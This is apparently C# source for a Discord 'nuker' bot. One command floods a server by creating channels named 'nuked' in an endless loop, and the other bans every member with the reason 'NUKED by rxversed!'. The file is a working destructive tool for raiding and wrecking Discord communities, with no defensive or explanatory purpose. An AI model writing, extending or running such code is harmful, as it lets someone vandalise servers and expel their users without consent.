using Discord;
using Discord.Commands;
using Discord.WebSocket;
using System;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace DotNetNuker.Commands
{
    public class MassChannel : ModuleBase
    {
        

        [Command("Mass Channel", RunMode = RunMode.Async)]

        public async Task RunMassChannel()
        {
            await ReplyAsync("Alright!");
            
            
            for (; ; )
            {
                await Context.Guild.CreateTextChannelAsync("nuked");

                Thread.Sleep(50);
            }

           
        }
    }

    public class MassBan : ModuleBase
    {
        [Command("Mass Ban", RunMode = RunMode.Async)]

        public async Task RunMassDelete()
        {
            await ReplyAsync("Okey Dokey!");


            foreach (var users in await Context.Guild.GetUsersAsync())
            {
                try
                {
                    await Context.Guild.AddBanAsync(users, 0, "NUKED by rxversed!"); 
                    Thread.Sleep(50);
                } 
                catch
                {
                    MessageBox.Show("Error!", null, MessageBoxButtons.OK, MessageBoxIcon.Error);
                }

            }
        }
    }
}
